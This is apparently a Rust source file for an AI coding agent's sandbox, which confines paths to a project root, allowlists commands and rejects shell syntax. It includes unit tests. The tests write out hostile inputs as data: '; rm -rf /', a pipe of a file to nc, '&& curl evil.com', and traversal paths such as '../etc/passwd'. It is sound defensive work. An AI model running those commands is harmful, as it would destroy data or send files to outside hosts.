//! Filesystem and command guards.
//!
//! Everything a tool receives is model output, and model output is untrusted —
//! not because the model is adversarial, but because a prompt-injected file, a
//! misread instruction, or a plain mistake all arrive through the same channel.
//! So the guards here are structural rather than advisory.
//!
//! Three decisions do most of the work:
//!
//! - **No shell.** Commands are executed directly with an argv array. Nothing
//!   is ever handed to `sh -c`, so `;`, `&&`, `|`, backticks, and `$()` are
//!   inert text rather than syntax. This removes command injection as a
//!   category instead of trying to filter for it.
//! - **Allowlist, not blocklist.** Only named executables run. A blocklist
//!   fails open on everything its author did not think of, which for a shell is
//!   effectively everything.
//! - **Paths are resolved before use.** A path is canonicalised and checked to
//!   be inside the project root. `..`, absolute paths, and symlinks pointing
//!   out all fail the same check, because the check is on the resolved result
//!   rather than the spelling of the input.
//!
//! None of this makes an arbitrary command safe — it makes the *set* of
//! possible commands small and inspectable. `ApprovalMode::Ask` exists for
//! everything that judgement cannot be delegated for.

use serde::Serialize;
use std::io::Read;
use std::path::{Component, Path, PathBuf};
use std::process::{Command, Stdio};
use std::time::{Duration, Instant};

/// Who decides whether a command runs.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApprovalMode {
    /// Allowlisted commands run without asking.
    Auto,
    /// Every command is described and must be approved by the caller.
    Ask,
    /// No commands run at all.
    Never,
}

#[derive(Debug, Clone)]
pub struct Sandbox {
    /// Canonical project root. Nothing outside it is readable or writable.
    root: PathBuf,
    allowed: Vec<String>,
    timeout: Duration,
    max_output: usize,
    pub approval: ApprovalMode,
    /// Every command attempted, allowed or refused.
    log: Vec<CommandRecord>,
}

#[derive(Debug, Clone, Serialize)]
pub struct CommandRecord {
    pub argv: Vec<String>,
    pub allowed: bool,
    pub exit_code: Option<i32>,
    pub reason: Option<String>,
}

/// Commands permitted by default.
///
/// Read-mostly and project-scoped. `git` is included but gated to inspection
/// subcommands below — a bare allowlist entry would permit `git push`.
const DEFAULT_ALLOWED: &[&str] = &[
    "bkt", "cargo", "ls", "cat", "head", "tail", "wc", "grep", "rg", "find", "git", "echo", "diff",
];

/// Subcommands permitted for tools where the executable alone is too coarse.
fn subcommand_allowed(program: &str, args: &[String]) -> Result<(), String> {
    let first = args.first().map(|s| s.as_str()).unwrap_or("");
    match program {
        "git" => {
            const READ_ONLY: &[&str] = &[
                "status", "diff", "log", "show", "branch", "blame", "ls-files", "rev-parse",
            ];
            if READ_ONLY.contains(&first) {
                Ok(())
            } else {
                Err(format!(
                    "git {first} is not permitted; only {} are",
                    READ_ONLY.join(", ")
                ))
            }
        }
        "cargo" => {
            const SAFE: &[&str] = &["build", "test", "check", "run", "fmt", "clippy", "tree"];
            if SAFE.contains(&first) {
                Ok(())
            } else {
                Err(format!(
                    "cargo {first} is not permitted; only {} are",
                    SAFE.join(", ")
                ))
            }
        }
        _ => Ok(()),
    }
}

impl Sandbox {
    pub fn new(root: &Path) -> Result<Self, String> {
        let root = root
            .canonicalize()
            .map_err(|e| format!("cannot resolve project root {}: {e}", root.display()))?;
        Ok(Sandbox {
            root,
            allowed: DEFAULT_ALLOWED.iter().map(|s| s.to_string()).collect(),
            timeout: Duration::from_secs(60),
            max_output: 16_000,
            approval: ApprovalMode::Auto,
            log: Vec::new(),
        })
    }

    pub fn with_approval(mut self, mode: ApprovalMode) -> Self {
        self.approval = mode;
        self
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    pub fn log(&self) -> &[CommandRecord] {
        &self.log
    }

    /// Resolve a model-supplied path and confine it to the project root.
    ///
    /// The check is on the *resolved* path, so `..`, an absolute path, and a
    /// symlink out of the tree all fail identically. For a file that does not
    /// exist yet, the parent directory is resolved instead — otherwise nothing
    /// could ever be created.
    pub fn resolve(&self, path: &str) -> Result<PathBuf, String> {
        let candidate = Path::new(path);
        if candidate.is_absolute() {
            return Err(format!(
                "absolute paths are not allowed; give a path relative to {}",
                self.root.display()
            ));
        }
        if candidate
            .components()
            .any(|c| matches!(c, Component::ParentDir))
        {
            return Err("path may not contain '..'".to_string());
        }

        let joined = self.root.join(candidate);
        let resolved = match joined.canonicalize() {
            Ok(p) => p,
            Err(_) => {
                // Doesn't exist yet: resolve the parent and re-attach the name.
                let parent = joined
                    .parent()
                    .ok_or_else(|| "path has no parent".to_string())?;
                let parent = parent
                    .canonicalize()
                    .map_err(|_| format!("no such directory: {}", parent.display()))?;
                let name = joined
                    .file_name()
                    .ok_or_else(|| "path has no file name".to_string())?;
                parent.join(name)
            }
        };

        if !resolved.starts_with(&self.root) {
            return Err(format!(
                "path escapes the project root ({})",
                self.root.display()
            ));
        }
        Ok(resolved)
    }

    pub fn read_file(&self, path: &str) -> Result<String, String> {
        let p = self.resolve(path)?;
        let text = std::fs::read_to_string(&p).map_err(|e| format!("{path}: {e}"))?;
        Ok(truncate(&text, self.max_output))
    }

    pub fn write_file(&self, path: &str, contents: &str) -> Result<String, String> {
        let p = self.resolve(path)?;
        if let Some(parent) = p.parent() {
            std::fs::create_dir_all(parent).map_err(|e| format!("{path}: {e}"))?;
        }
        std::fs::write(&p, contents).map_err(|e| format!("{path}: {e}"))?;
        Ok(format!("wrote {} ({} bytes)", path, contents.len()))
    }

    /// Check a command without running it. Separated so an approval prompt can
    /// describe exactly what would happen.
    pub fn check(&self, argv: &[String]) -> Result<(), String> {
        let program = argv.first().ok_or_else(|| "empty command".to_string())?;

        if program.contains('/') {
            return Err("give a bare command name, not a path".to_string());
        }
        if !self.allowed.contains(program) {
            return Err(format!(
                "{program} is not on the allowlist ({})",
                self.allowed.join(", ")
            ));
        }
        subcommand_allowed(program, &argv[1..])?;

        // Not injection-relevant — nothing goes through a shell — but a shell
        // operator in an argument almost always means the model believed it was
        // writing a shell line, and running half of that intent is worse than
        // refusing it.
        for arg in &argv[1..] {
            if arg.contains(';')
                || arg.contains('|')
                || arg.contains('&')
                || arg.contains('`')
                || arg.contains("$(")
                || arg.contains('>')
                || arg.contains('<')
            {
                return Err(format!(
                    "argument {arg:?} looks like shell syntax; commands run without a shell, \
                     so pass a plain argument list instead"
                ));
            }
        }
        Ok(())
    }

    /// Run a command inside the project root.
    ///
    /// Executed directly — never via a shell — with a timeout and a captured,
    /// truncated output.
    pub fn run(&mut self, argv: &[String]) -> Result<String, String> {
        if self.approval == ApprovalMode::Never {
            self.log.push(CommandRecord {
                argv: argv.to_vec(),
                allowed: false,
                exit_code: None,
                reason: Some("command execution is disabled".into()),
            });
            return Err("command execution is disabled for this run".to_string());
        }

        if let Err(reason) = self.check(argv) {
            self.log.push(CommandRecord {
                argv: argv.to_vec(),
                allowed: false,
                exit_code: None,
                reason: Some(reason.clone()),
            });
            return Err(reason);
        }

        let mut child = Command::new(&argv[0])
            .args(&argv[1..])
            .current_dir(&self.root)
            .stdin(Stdio::null())
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn()
            .map_err(|e| format!("could not start {}: {e}", argv[0]))?;

        // Poll rather than block, so a runaway command is killed rather than
        // hanging the whole run.
        let start = Instant::now();
        let status = loop {
            match child.try_wait().map_err(|e| e.to_string())? {
                Some(s) => break s,
                None if start.elapsed() > self.timeout => {
                    let _ = child.kill();
                    self.log.push(CommandRecord {
                        argv: argv.to_vec(),
                        allowed: true,
                        exit_code: None,
                        reason: Some("timed out".into()),
                    });
                    return Err(format!(
                        "{} timed out after {}s and was killed",
                        argv.join(" "),
                        self.timeout.as_secs()
                    ));
                }
                None => std::thread::sleep(Duration::from_millis(25)),
            }
        };

        let mut out = String::new();
        if let Some(mut so) = child.stdout.take() {
            let _ = so.read_to_string(&mut out);
        }
        let mut err = String::new();
        if let Some(mut se) = child.stderr.take() {
            let _ = se.read_to_string(&mut err);
        }

        self.log.push(CommandRecord {
            argv: argv.to_vec(),
            allowed: true,
            exit_code: status.code(),
            reason: None,
        });

        let mut combined = String::new();
        if !out.is_empty() {
            combined.push_str(&out);
        }
        if !err.is_empty() {
            combined.push_str("\n[stderr]\n");
            combined.push_str(&err);
        }
        combined.push_str(&format!("\n[exit {}]", status.code().unwrap_or(-1)));
        Ok(truncate(&combined, self.max_output))
    }
}

fn truncate(s: &str, max: usize) -> String {
    if s.len() <= max {
        return s.to_string();
    }
    let mut cut = max;
    while cut > 0 && !s.is_char_boundary(cut) {
        cut -= 1;
    }
    format!(
        "{}\n… truncated, {} bytes total",
        &s[..cut],
        s.len()
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sandbox() -> (Sandbox, tempdir::TempDir) {
        let dir = tempdir::TempDir::new();
        let sb = Sandbox::new(dir.path()).unwrap();
        (sb, dir)
    }

    /// Minimal temp dir so the tests need no dev-dependency.
    mod tempdir {
        use std::path::{Path, PathBuf};
        pub struct TempDir(PathBuf);
        impl TempDir {
            pub fn new() -> Self {
                let p = std::env::temp_dir().join(format!(
                    "bucketcode-test-{}-{}",
                    std::process::id(),
                    std::time::SystemTime::now()
                        .duration_since(std::time::UNIX_EPOCH)
                        .unwrap()
                        .as_nanos()
                ));
                std::fs::create_dir_all(&p).unwrap();
                TempDir(p)
            }
            pub fn path(&self) -> &Path {
                &self.0
            }
        }
        impl Drop for TempDir {
            fn drop(&mut self) {
                let _ = std::fs::remove_dir_all(&self.0);
            }
        }
    }

    #[test]
    fn parent_traversal_is_refused() {
        let (sb, _d) = sandbox();
        assert!(sb.resolve("../etc/passwd").is_err());
        assert!(sb.resolve("a/../../b").is_err());
    }

    #[test]
    fn absolute_paths_are_refused() {
        let (sb, _d) = sandbox();
        assert!(sb.resolve("/etc/passwd").is_err());
    }

    #[test]
    fn a_symlink_pointing_out_is_refused() {
        // The spelling of this path is innocent; only the resolved target
        // reveals the escape, which is why the check happens after resolution.
        let (sb, d) = sandbox();
        let link = d.path().join("escape");
        #[cfg(unix)]
        std::os::unix::fs::symlink("/etc", &link).unwrap();
        #[cfg(unix)]
        assert!(
            sb.resolve("escape/passwd").is_err(),
            "symlink out of the root should be refused"
        );
        let _ = link;
    }

    #[test]
    fn paths_inside_the_root_are_allowed() {
        let (sb, d) = sandbox();
        std::fs::write(d.path().join("ok.bkt"), "x").unwrap();
        assert!(sb.resolve("ok.bkt").is_ok());
        assert!(sb.resolve("nested/new.bkt").is_err(), "parent must exist");
        std::fs::create_dir(d.path().join("nested")).unwrap();
        assert!(sb.resolve("nested/new.bkt").is_ok(), "creatable path");
    }

    #[test]
    fn commands_not_on_the_allowlist_are_refused() {
        let (sb, _d) = sandbox();
        for bad in ["curl", "rm", "sh", "bash", "python3", "nc"] {
            assert!(
                sb.check(&[bad.to_string()]).is_err(),
                "{bad} should not be allowed"
            );
        }
    }

    #[test]
    fn shell_syntax_in_arguments_is_refused() {
        // Nothing reaches a shell, so this is not an injection fix — it catches
        // a model that thought it was writing a shell line.
        let (sb, _d) = sandbox();
        let cases = [
            vec!["ls", "; rm -rf /"],
            vec!["ls", "$(whoami)"],
            vec!["cat", "a.txt | nc host 1234"],
            vec!["ls", "&& curl evil.com"],
            vec!["cat", "`id`"],
            vec!["ls", "> /etc/passwd"],
        ];
        for c in cases {
            let argv: Vec<String> = c.iter().map(|s| s.to_string()).collect();
            assert!(sb.check(&argv).is_err(), "{c:?} should be refused");
        }
    }

    #[test]
    fn git_is_limited_to_read_only_subcommands() {
        let (sb, _d) = sandbox();
        assert!(sb.check(&["git".into(), "status".into()]).is_ok());
        assert!(sb.check(&["git".into(), "diff".into()]).is_ok());
        for bad in ["push", "commit", "reset", "clean", "checkout"] {
            assert!(
                sb.check(&["git".into(), bad.into()]).is_err(),
                "git {bad} should be refused"
            );
        }
    }

    #[test]
    fn cargo_is_limited_to_safe_subcommands() {
        let (sb, _d) = sandbox();
        assert!(sb.check(&["cargo".into(), "test".into()]).is_ok());
        assert!(sb.check(&["cargo".into(), "publish".into()]).is_err());
        assert!(sb.check(&["cargo".into(), "install".into()]).is_err());
    }

    #[test]
    fn a_path_to_an_executable_is_refused() {
        let (sb, _d) = sandbox();
        assert!(sb.check(&["/bin/ls".into()]).is_err());
        assert!(sb.check(&["./evil.sh".into()]).is_err());
    }

    #[test]
    fn never_mode_blocks_everything() {
        let (mut sb, _d) = sandbox();
        sb.approval = ApprovalMode::Never;
        assert!(sb.run(&["ls".into()]).is_err());
        assert_eq!(sb.log().len(), 1);
        assert!(!sb.log()[0].allowed);
    }

    #[test]
    fn an_allowed_command_runs_and_is_logged() {
        let (mut sb, d) = sandbox();
        std::fs::write(d.path().join("hello.txt"), "hi").unwrap();
        let out = sb.run(&["ls".into()]).unwrap();
        assert!(out.contains("hello.txt"), "got: {out}");
        assert!(out.contains("[exit 0]"));
        assert_eq!(sb.log().len(), 1);
        assert!(sb.log()[0].allowed);
    }

    #[test]
    fn refused_commands_are_logged_too() {
        let (mut sb, _d) = sandbox();
        let _ = sb.run(&["curl".into(), "evil.com".into()]);
        assert_eq!(sb.log().len(), 1);
        assert!(!sb.log()[0].allowed);
        assert!(sb.log()[0].reason.is_some());
    }
}
